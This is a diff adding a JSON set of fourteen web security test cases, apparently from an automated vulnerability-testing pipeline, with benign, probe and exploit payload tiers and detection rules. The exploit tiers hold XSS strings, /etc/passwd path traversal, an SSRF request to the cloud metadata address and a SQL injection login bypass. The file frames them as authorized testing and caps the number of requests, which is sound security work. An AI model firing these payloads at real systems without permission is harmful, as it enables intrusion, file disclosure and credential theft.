@@ -1,0 +1,1347 @@
+{
+  "test_cases": [
+    {
+      "id": "tc-hv-1",
+      "hypothesis_id": "hv-1",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/js/jquery.min.js",
+      "parameter": "url",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "1"
+            }
+          ],
+          "description": "Baseline benign value to establish normal response body and length",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "<script>/*x*/</script>"
+            }
+          ],
+          "description": "Probe payload with harmless script-like token to detect reflection in JS/DOM contexts",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "\"+alert(1)+\""
+            }
+          ],
+          "description": "Aggressive DOM-style payload attempting to break out of JS context (use only if probe indicates reflection)",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Existing authenticated session cookie required (observed cookie-based session management)",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF token present in cookies (observed auth_cookie_CSRF-TOKEN) if required by app for GETs",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "response body or returned JS contains exact payload string from query parameter 'url'",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "response body length differs by >=10% between benign and probe requests for same endpoint and parameter set",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Use observed session and CSRF cookie values from harvest; base_url set to example.invalid because real host must be taken from observation. If tokens not available, test cannot run.",
+      "tags": [
+        "xss",
+        "dom",
+        "regex-reflection"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-2",
+      "hypothesis_id": "hv-2",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/js/bootstrap.min.js",
+      "parameter": "toggle",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "1"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "onToggleProbe"
+            }
+          ],
+          "description": "Probe token to detect reflection in JS content or attribute names",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "');alert(1);//"
+            }
+          ],
+          "description": "Exploit-style payload to attempt breaking out of JS strings if reflection confirmed",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Authenticated cookie required",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF cookie if present",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "response body or JS resource contains exact probe payload value from 'toggle' parameter",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=10% body length change between baseline and probe responses",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Ensure real host and cookie values are substituted from observation before executing. If unavailable set needs_observation=true.",
+      "tags": [
+        "xss",
+        "dom"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-3",
+      "hypothesis_id": "hv-3",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/js/angular.min.js",
+      "parameter": "document",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "1"
+            }
+          ],
+          "description": "Baseline benign value",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "DOC_PROBE_123"
+            }
+          ],
+          "description": "Probe token to detect reflection in Angular templates or JS",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "');console.log(1);//"
+            }
+          ],
+          "description": "Exploit-style payload to attempt to break out of JS context if reflection present",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Cookie-based session required",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF cookie if present",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "response body or JS contains the exact probe payload value from 'document' parameter",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=10% length change between benign and probe responses",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Requires observed session/CSRF cookie values to execute. If tokens not present, set needs_observation=true.",
+      "tags": [
+        "xss",
+        "dom",
+        "angular"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-4",
+      "hypothesis_id": "hv-4",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "image_url",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "https://example.com/blank.png"
+            }
+          ],
+          "description": "Baseline: harmless fully-qualified image URL to establish storage/display behavior",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "https://example.com/probe.png?injection=1"
+            }
+          ],
+          "description": "Probe remote URL containing unique token to detect later reflection or stored display",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "javascript:alert(1)"
+            }
+          ],
+          "description": "Exploit payload attempting JS URL in image src (only if probe indicates stored reflection)",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Authenticated session cookie needed to create/view stored content",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF cookie/token may be required when creating stored content via POST/other flows; include if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "Stored content causes >=30% increase in response body length between baseline and post-store gallery view",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "reflected_input",
+          "condition": "probe URL value appears verbatim in gallery or image src attribute when viewing /pictures/ or related endpoints",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 3,
+      "delay_between_requests": 1.0,
+      "notes": "This hypothesis requires observing storage behavior (needs_observation=true). Do not execute exploit payload without positive probe results. Substitute real session/CSRF cookie values.",
+      "tags": [
+        "xss",
+        "stored",
+        "ssr"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "tc-hv-5",
+      "hypothesis_id": "hv-5",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "filename",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "sample.jpg"
+            }
+          ],
+          "description": "Baseline normal filename",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "../etc/passwd"
+            }
+          ],
+          "description": "Probe path traversal token to trigger file handling errors",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "../../../../../../etc/passwd"
+            }
+          ],
+          "description": "Deeper traversal attempt to provoke error signatures if backend reads file paths",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Session cookie if required for access",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Response contains file system error strings or stack traces indicative of file inclusion/read attempts",
+          "threshold": {
+            "expected_codes": [
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Status code deviates from baseline to one of [400,403,404,500] when probing filename values",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              403,
+              404,
+              500
+            ]
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 15
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Do not attempt deeper destructive probes beyond provided max_requests. If no cookies observed, tests may still run for public endpoints. Set needs_observation=true if tokens missing.",
+      "tags": [
+        "file-inclusion",
+        "path-traversal"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "tc-hv-6",
+      "hypothesis_id": "hv-6",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/pictures/",
+      "parameter": "_id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "1"
+            }
+          ],
+          "description": "Baseline existing id to measure reference response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "2"
+            }
+          ],
+          "description": "Probe different id to detect authorization/availability differences",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "999999"
+            }
+          ],
+          "description": "Edge id to test access to other resources (non-destructive)",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Cookie-based session to access user-scoped resources",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Status code changes between baseline and other _id values to 401/403/404 indicating auth checks",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=50% response body length difference between baseline and other _id values indicating different resource content",
+          "threshold": {
+            "body_length_delta_pct": 50.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 25
+      },
+      "max_retries": 3,
+      "delay_between_requests": 0.5,
+      "notes": "Ensure provided baseline _id exists; if not, set needs_observation=true to identify valid ids. Substitute observed session cookie.",
+      "tags": [
+        "idor",
+        "authorization"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "tc-hv-7",
+      "hypothesis_id": "hv-7",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/user_info/",
+      "parameter": "_id",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "self"
+            }
+          ],
+          "description": "Baseline using current user's id token or 'self' to get own info",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "other_user_id"
+            }
+          ],
+          "description": "Probe another user id (must be non-destructive and authorized via observation) to detect IDOR",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "999999"
+            }
+          ],
+          "description": "Edge id to attempt access to non-owner resource (only if probe indicates lax checks)",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Valid authenticated user session required to access /user_info/",
+          "extract_from": "/login response cookies or session store",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Include CSRF cookie if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Status code differs between baseline and probe (e.g., baseline 200, probe 200 when expecting 403) indicating IDOR",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=30% response body length change between baseline and probe indicating access to different user data",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 3,
+      "delay_between_requests": 0.5,
+      "notes": "Must supply real authenticated session and valid other_user_id from observation. If those are not available, set needs_observation=true and do not run.",
+      "tags": [
+        "idor",
+        "userinfo",
+        "authorization"
+      ],
+      "estimated_duration": 180
+    },
+    {
+      "id": "tc-hv-8",
+      "hypothesis_id": "hv-8",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/user_info/",
+      "parameter": "password",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "test"
+            }
+          ],
+          "description": "Baseline benign password parameter to observe normal behavior",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "p@ssw0rd-probe"
+            }
+          ],
+          "description": "Probe to detect reflection of provided password value in response",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "\"+sensitive+\""
+            }
+          ],
+          "description": "Exploit-style payload to increase chance of reflection; only run if probe suggests reflection",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Authenticated session required to reach user_info content",
+          "extract_from": "/login response cookies",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF cookie/token if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Response body contains exact probe password value indicating sensitive data echo",
+          "threshold": {
+            "body_length_delta_pct": 5.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": ">=20% body length difference between baseline and probe responses indicating potential additional sensitive content returned",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Requires authenticated session. Do not use real credentials beyond harmless probes. If session not available set needs_observation=true.",
+      "tags": [
+        "sensitive-data",
+        "disclosure"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "tc-hv-9",
+      "hypothesis_id": "hv-9",
+      "base_url": "http://example.invalid",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "image_url",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"image_url\":\"https://example.com/blank.png\"}"
+            }
+          ],
+          "description": "Baseline safe external URL in JSON body to observe behavior",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"image_url\":\"http://oob-server.example/probe-12345\"}"
+            }
+          ],
+          "description": "OOB-capable probe URL pointing to controlled OOB domain to detect backend fetch (requires OOB infrastructure)",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"image_url\":\"http://169.254.169.254/latest/meta-data/\"}"
+            }
+          ],
+          "description": "Server-side SSrf probe for internal metadata (run only with explicit authorization and directed scope)",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "CSRF token required by endpoint as indicated in API spec; include auth_cookie_CSRF-TOKEN if present",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        },
+        {
+          "type": "session_state",
+          "description": "Authenticated session cookie required",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Response contains URL parsing, network fetch, or proxy error messages (e.g., 'failed to fetch','could not resolve','connect timed out')",
+          "threshold": {
+            "expected_codes": [
+              400,
+              422,
+              500
+            ]
+          },
+          "weight": 0.9
+        },
+        {
+          "signal": "http_callback",
+          "condition": "An HTTP request to the OOB domain is observed within 5s of sending the probe payload from the backend (correlate probe id)",
+          "threshold": {
+            "timing_ms": 5000
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Exploit tier targeting internal metadata should only be used with explicit authorization; benign and probe tiers are preferred. Requires OOB infrastructure for http_callback oracle. If CSRF/session tokens unavailable set needs_observation=true.",
+      "tags": [
+        "ssrf",
+        "oob"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "tc-hv-10",
+      "hypothesis_id": "hv-10",
+      "base_url": "http://example.invalid",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "filename",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"filename\":\"sample.jpg\"}"
+            }
+          ],
+          "description": "Baseline filename in JSON body",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"filename\":\"../etc/passwd\"}"
+            }
+          ],
+          "description": "Probe path traversal in filename to provoke include/read errors",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"filename\":\"../../../../../../etc/passwd\"}"
+            }
+          ],
+          "description": "Deeper traversal attempt (only if probe yields indicative errors)",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "CSRF token required for POST actions; include cookie token if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        },
+        {
+          "type": "session_state",
+          "description": "Authenticated session cookie required for uploads",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Response contains inclusion/path error messages or stack traces after sending traversal payloads",
+          "threshold": {
+            "expected_codes": [
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Status code changes to one of [400,403,404,500] when sending traversal filenames compared to baseline 200/201",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              403,
+              404,
+              500
+            ]
+          },
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 15
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not attempt destructive inclusion beyond probe/exploit tiers. Requires session and CSRF tokens; set needs_observation=true if unavailable.",
+      "tags": [
+        "file-inclusion",
+        "path-traversal"
+      ],
+      "estimated_duration": 180
+    },
+    {
+      "id": "tc-hv-11",
+      "hypothesis_id": "hv-11",
+      "base_url": "http://example.invalid",
+      "method": "POST",
+      "endpoint": "/upload_photo/",
+      "parameter": "description",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"description\":\"Just a photo\"}"
+            }
+          ],
+          "description": "Baseline safe description",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"description\":\"<b>desc-probe-123</b>\"}"
+            }
+          ],
+          "description": "Probe with HTML-like content to detect stored XSS reflection in gallery/user pages",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "{\"description\":\"<img src=1 onerror=alert(1)>\"}"
+            }
+          ],
+          "description": "Stored XSS payload for exploit tier; run only after positive probe and with authorization",
+          "encoding": "utf-8",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "CSRF token required for POST; include cookie token if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        },
+        {
+          "type": "session_state",
+          "description": "Authenticated session cookie required to create stored content",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Description text from probe appears verbatim in gallery or user pages (e.g., /pictures/ or /user_pictures/) without HTML-encoding",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Stored description causes >=30% change in resource representation when viewed after creation",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200,
+              201
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 30
+      },
+      "max_retries": 3,
+      "delay_between_requests": 1.0,
+      "notes": "Exploit payload includes active JS; only use if probe confirms storage and with explicit authorization. Requires session and CSRF tokens. If tokens missing set needs_observation=true.",
+      "tags": [
+        "xss",
+        "stored"
+      ],
+      "estimated_duration": 600
+    },
+    {
+      "id": "tc-hv-12",
+      "hypothesis_id": "hv-12",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/login",
+      "parameter": "user",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "mail@example.com"
+            }
+          ],
+          "description": "Baseline known sample from observation to confirm expected behavior",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "nonexistent_user@example.com"
+            }
+          ],
+          "description": "Probe different user value to detect anomalous auth flow or success responses",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "' OR '1'='1"
+            }
+          ],
+          "description": "SQLi-style parameter to detect authn bypass via injection; run only if allowed and with caution",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "csrf_token",
+          "description": "CSRF token expected in form login; include auth_cookie_CSRF-TOKEN if observed",
+          "bind_to": "Cookie: auth_cookie_CSRF-TOKEN=<observed_csrf_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Status code or redirect behavior changes between baseline and probe/exploit values (e.g., unexpected 200/302 for unknown user or SQLi payload)",
+          "threshold": {
+            "expected_codes": [
+              200,
+              302,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Do not attempt exploit tier SQLi on production systems without explicit permission. Use only the benign and probe tiers by default. Include CSRF cookie from observation.",
+      "tags": [
+        "authn",
+        "injection"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-13",
+      "hypothesis_id": "hv-13",
+      "base_url": "https://example.invalid",
+      "method": "GET",
+      "endpoint": "/css",
+      "parameter": "family",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "Open+Sans"
+            }
+          ],
+          "description": "Baseline font family value to record normal stylesheet response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family-probe-123"
+            }
+          ],
+          "description": "Probe token to detect reflection into CSS or inline styles",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "*{background:url(javascript:alert(1))}"
+            }
+          ],
+          "description": "CSS-based XSS attempt; only run after probe positive and with authorization",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Include session cookie if observed; many CSS endpoints public but cookie observed in context",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Probe token appears verbatim in returned CSS or inline stylesheet affecting DOM",
+          "threshold": {
+            "body_length_delta_pct": 10.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Base URL uses HTTPS per discovery. Replace example.invalid with observed host and include cookies if present.",
+      "tags": [
+        "xss",
+        "css"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "tc-hv-14",
+      "hypothesis_id": "hv-14",
+      "base_url": "http://example.invalid",
+      "method": "GET",
+      "endpoint": "/js/ng-file-upload-shim.min.js",
+      "parameter": "file",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "sample.txt"
+            }
+          ],
+          "description": "Baseline filename query to establish normal response",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "../etc/passwd"
+            }
+          ],
+          "description": "Probe path traversal token to detect inclusion/file handling errors",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "../../../../../../etc/passwd"
+            }
+          ],
+          "description": "Deeper traversal attempt to provoke inclusion errors if present",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Session cookie if required",
+          "bind_to": "Cookie: auth_cookie_session=<observed_session_value>"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Response contains filesystem/include error messages or stack traces after traversal probes",
+          "threshold": {
+            "expected_codes": [
+              400,
+              404,
+              500
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Status code changes to one of [400,403,404,500] when sending traversal values compared to baseline 200",
+          "threshold": {
+            "expected_codes": [
+              200,
+              400,
+              403,
+              404,
+              500
+            ]
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Do not run exploit tier on production systems without approval. If no session cookie is available it's still safe to run for public endpoints. Set needs_observation=true if required data missing.",
+      "tags": [
+        "file-inclusion",
+        "path-traversal"
+      ],
+      "estimated_duration": 120
+    }
+  ]
+}
